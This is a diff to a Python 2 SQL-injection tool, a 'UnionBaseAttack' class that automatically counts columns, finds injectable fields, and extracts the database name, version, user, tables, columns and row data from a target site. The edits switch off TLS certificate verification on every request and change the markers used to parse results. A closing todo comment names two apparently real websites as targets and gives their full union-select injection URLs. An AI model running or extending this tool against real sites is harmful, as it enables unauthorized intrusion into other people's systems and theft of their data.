@@ -25,7 +25,7 @@ class UnionBaseAttack(object):
         #order by injection with error
         for item in define_order_by_command_php:
             lib.sleep(.5)
-            secondResponse = lib.requests.get(url=self.url + str(item), headers=define_headerdata)
+            secondResponse = lib.requests.get(url=self.url + str(item), headers=define_headerdata, verify=False)
             if secondResponse.content.find(define_error_order_by_php[0]) is not -1:
                 injected_method = item[0:10]
                 print TextColor.CVIOLET + str("\nI working on order by injection please wait until I found they columns") + TextColor.WHITE
@@ -51,7 +51,8 @@ class UnionBaseAttack(object):
             for item in define_order_by_command_php:
                 for counter in xrange(1, 1000):
                     lib.sleep(.5)
-                    secondResponse = lib.requests.get(url=self.url + item[0:10] + "%d --"%(counter), headers=define_headerdata)
+                    secondResponse = lib.requests.get(url=self.url + item[0:10] + "%d --"%(counter),
+                                                      headers=define_headerdata, verify=False)
                     if secondResponse.content.find("Unknown column '%d' in 'order clause'"%(counter)) is not -1:
                         done_str = self.url + item[0:10] + str(counter - 1)
                         print TextColor.CBEIGE + str("[+] Found => %d columns {%s}"%(counter - 1, done_str)) + TextColor.WHITE
@@ -65,7 +66,7 @@ class UnionBaseAttack(object):
         '''return count of columns that website has'''
         for counter in xrange(1, 1000):
             lib.sleep(1)
-            secondResponse = lib.requests.get(url=self.url + injectedMethod + str(counter))
+            secondResponse = lib.requests.get(url=self.url + injectedMethod + str(counter), verify=False)
             if secondResponse.content != self.firstResponse.content:
                 return counter - 1
 
@@ -91,7 +92,7 @@ class UnionBaseAttack(object):
         
         '''this below code test url with (-) in and forward of number in url'''
         for item in define_union_select_query_php:    
-            response = lib.requests.get(url=new_url + str(item + injection_string), headers=define_headerdata)
+            response = lib.requests.get(url=new_url + str(item + injection_string), headers=define_headerdata, verify=False)
             for numbers in list_my_injection_numbers:
                 if response.content.find(numbers) is not -1:
                     vuln_columns.append(numbers[0:1])
@@ -105,7 +106,8 @@ class UnionBaseAttack(object):
         '''this below code test raw url with no (-) in url'''
         if done_searching_columns == False:
             for item in define_union_select_query_php:    
-                response = lib.requests.get(url=self.url + str(item + injection_string), headers=define_headerdata)
+                response = lib.requests.get(url=self.url + str(item + injection_string), headers=define_headerdata,
+                                            verify=False)
                 for numbers in list_my_injection_numbers:
                     if response.content.find(numbers) is not -1:
                         vuln_columns.append(numbers[0:1])
@@ -136,12 +138,14 @@ class UnionBaseAttack(object):
         '''
             this function work on data in database and extract them with sql query injection
         '''
+        #we pick this two variables for writting results to file
         database_name = ""
         version_name = ""
 
         #----------------------------------------------Database extracting--------------------------------------------
         for item in define_database_detection_query_php:
-            response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)), headers=define_headerdata)
+            response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)),
+                                        headers=define_headerdata, verify=False)
             if response.content.find("'2134115356'") is not -1:
                 end = lib.re.search("'2134115356'", response.content).end()
                 starts = lib.re.search("'62134115356'", response.content).start()
@@ -153,7 +157,8 @@ class UnionBaseAttack(object):
         #------------------------------------------------------End of Database extracting-----------------------------------------------------
         #-----------------------------------------------Version extracting---------------------------------------------------
         for item in define_version_detection_query_php:
-            response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)), headers=define_headerdata)
+            response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)),
+                                        headers=define_headerdata, verify=False)
             if response.content.find("'2134115356'") is not -1:
                 end = lib.re.search("'2134115356'", response.content).end()
                 starts = lib.re.search("'62134115356'", response.content).start()
@@ -164,7 +169,8 @@ class UnionBaseAttack(object):
         #----------------------------------------------End of version extracting-------------------------------------------------
         #---------------------------------------------------------Extract User of database-------------------------------------------------
         for item in define_user_detection_query_php:
-            response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)), headers=define_headerdata)
+            response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)),
+                                        headers=define_headerdata, verify=False)
             if response.content.find("'2134115356'") is not -1:
                 end = lib.re.search("'2134115356'", response.content).end()
                 starts = lib.re.search("'62134115356'", response.content).start()
@@ -181,12 +187,12 @@ class UnionBaseAttack(object):
         for counter in xrange(0, len(define_get_tables_name_query_php)):
             response = lib.requests.get(str(lib.string.replace(success_InjectedString, 
                         vuln_columns[0], define_get_tables_name_query_php[counter])
-                        + define_end_string_group_concat_query_php[counter]),  headers=define_headerdata)
+                        + define_end_string_group_concat_query_php[counter]),  headers=define_headerdata, verify=False)
 
-            if response.content.find("GETTABLES=>") is not -1:
+            if response.content.find("'2134115356'") is not -1:
                 try:
-                    end = lib.re.search("GETTABLES=>", response.content).end()
-                    start = lib.re.search("<=GETTABLES", response.content).start()
+                    end = lib.re.search("'2134115356'", response.content).end()
+                    start = lib.re.search("'62134115356'", response.content).start()
                     print TextColor.CBEIGE2 + str("[+]Tables of database is => ") + TextColor.WHITE
                     tables_name = response.content[end:start].split(',')
                     break
@@ -205,12 +211,13 @@ class UnionBaseAttack(object):
             while True:
                 response = lib.requests.get(str(lib.string.replace(success_InjectedString, 
                             vuln_columns[0], define_convert_query_php[counter])
-                            + define_end_convert_query_php[counter] + "%d, 1"%(limit_counter)),  headers=define_headerdata)
+                            + define_end_convert_query_php[counter] + "%d, 1"%(limit_counter)),
+                                            headers=define_headerdata, verify=False)
 
-                if response.content.find("GETTABLES=>") is not -1:
+                if response.content.find("'2134115356'") is not -1:
                     try:
-                        end = lib.re.search("GETTABLES=>", response.content).end()
-                        start = lib.re.search("<=GETTABLES", response.content).start()
+                        end = lib.re.search("'2134115356'", response.content).end()
+                        start = lib.re.search("'62134115356'", response.content).start()
                         tables_name.append(response.content[end:start])
                         limit_counter = limit_counter + 1
                     except:
@@ -240,11 +247,12 @@ class UnionBaseAttack(object):
             for counter in xrange(0, len(define_get_columns_of_table_query_php)):
                 response = lib.requests.get(str(lib.string.replace(success_InjectedString, 
                             vuln_columns[0], define_get_columns_of_table_query_php[counter])
-                            + define_end_string_columns_of_table_query_php[counter] + "%27" + selected_table + "%27"),  headers=define_headerdata)
-                if response.content.find("GETCOLUMNS=>") is not -1:
+                            + define_end_string_columns_of_table_query_php[counter] + "%27" + selected_table + "%27"),
+                                            headers=define_headerdata, verify=False)
+                if response.content.find("'2134115356'") is not -1:
                     try:
-                        end = lib.re.search("GETCOLUMNS=>", response.content).end()
-                        start = lib.re.search("<=GETCOLUMNS", response.content).start()
+                        end = lib.re.search("'2134115356'", response.content).end()
+                        start = lib.re.search("'62134115356'", response.content).start()
                         print TextColor.CBEIGE2 + str("[+]Column of %s is => "%(selected_table)) + TextColor.WHITE
                         column_exttracted = response.content[end:start].split(',')
                     except: 
@@ -262,11 +270,11 @@ class UnionBaseAttack(object):
                     response = lib.requests.get(str(lib.string.replace(success_InjectedString, 
                                 vuln_columns[0], define_get_columns_of_table_convert_query_php[counter])
                                 + define_end_columns_of_table_convert_query_php[counter] + "%27" + selected_table + "%27" 
-                                + " limit %d, 1"%(limit_counter)),  headers=define_headerdata)
-                    if response.content.find("GETCOLUMNS=>") is not -1:
+                                + " limit %d, 1"%(limit_counter)),  headers=define_headerdata, verify=False)
+                    if response.content.find("'2134115356'") is not -1:
                         try:
-                            end = lib.re.search("GETCOLUMNS=>", response.content).end()
-                            start = lib.re.search("<=GETCOLUMNS", response.content).start()
+                            end = lib.re.search("'2134115356'", response.content).end()
+                            start = lib.re.search("'62134115356'", response.content).start()
                             column_exttracted.append(response.content[end:start])
                             limit_counter = limit_counter + 1
                         except:
@@ -300,10 +308,10 @@ class UnionBaseAttack(object):
 
                     response = lib.requests.get(str(lib.string.replace(success_InjectedString, 
                                 vuln_columns[0], exchange)
-                                + " FrOm " + selected_table),  headers=define_headerdata)
-                    if response.content.find("GETCOLUMNSDATA=>") is not -1:
-                        end = lib.re.search("GETCOLUMNSDATA=>", response.content).end()
-                        start = lib.re.search("<=GETCOLUMNSDATA", response.content).start()
+                                + " FrOm " + selected_table),  headers=define_headerdata, verify=False)
+                    if response.content.find("'2134115356'") is not -1:
+                        end = lib.re.search("'2134115356'", response.content).end()
+                        start = lib.re.search("'62134115356'", response.content).start()
                         print TextColor.CBEIGE2 + str("[+]Data of %s is => "%(selected_column)) + TextColor.WHITE
                         datas = response.content[end:start].split(',')
                         break
@@ -320,7 +328,7 @@ class UnionBaseAttack(object):
 
 
 '''
-    todo: http://www.jazzjournal.co.uk/article.php?id=-20%20union%20select%201,concat(QUOTE(11111111111),version(),QUOTE(11111111111)),3,4,5,version(),7,8,9,10,11,12
+    todo: http://www.jazzjournal.co.uk/article.php?id=20%20union%20select%201,concat(QUOTE(11111111111),version(),QUOTE(11111111111)),3,4,5,version(),7,8,9,10,11,12
     check this target 
 
     todo: http://www.atmarine.fi/index.php?id=-2%20union%20select%201,2,concat(%27hello%27,%20version(),%20%27hello%27),4,5,6,7,8,9,10
